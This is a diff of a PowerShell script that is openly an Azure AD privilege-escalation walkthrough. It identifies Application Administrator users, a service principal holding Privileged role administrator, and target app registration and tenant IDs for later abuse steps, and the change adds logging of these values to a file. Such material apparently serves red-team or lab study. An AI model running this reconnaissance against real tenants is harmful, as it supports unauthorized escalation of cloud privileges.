@@ -26,7 +26,8 @@ if ( $results.count -gt 1 ) {
  $upn = $results
 }
 
-Write-Host("upn to target Application Administrator: $upn") 
+Write-Host("upn/username to target Application Administrator: $upn") 
+"UPN or username to target Application Administrator: $upn" | Out-File -FilePath output.txt
 
 # Step 1.2: Ensure that there is a Service Principal for abuse with Privileged role administrator 
 Get-AzureADDirectoryRole  | ?{$_.DisplayName -eq 'Privileged role administrator'}
@@ -85,10 +86,13 @@ if ( $targetappRegistration.count -ge 1 ) {
   $objectid = $targetappRegistration.ObjectId
   $appid = $targetappRegistration.AppId
   Write-Host("This is the ObjectId to target in the next step:  $objectid")
+  Add-Content -Path output.txt -Value "Target ObjectId: $objectid"
   Write-Host("This is the AppId to target in the next step:  $appid")
+  Add-Content -Path output.txt -Value "Target AppId: $appid"
   $tenantDetails = Get-AzureADTenantDetail
   $tenantid = $tenantDetails.ObjectId
-  Write-Host("This is the TenantId to target in the next step:  $tenantid")
+  Write-Host("This is the TenantId to target in the next step:  $tenantid") -Append
+  Add-Content -Path output.txt -Value "Target TenantId: $tenantid"
 }
 
 # Step 1.4:  Disconnect as this regular Azure AD user
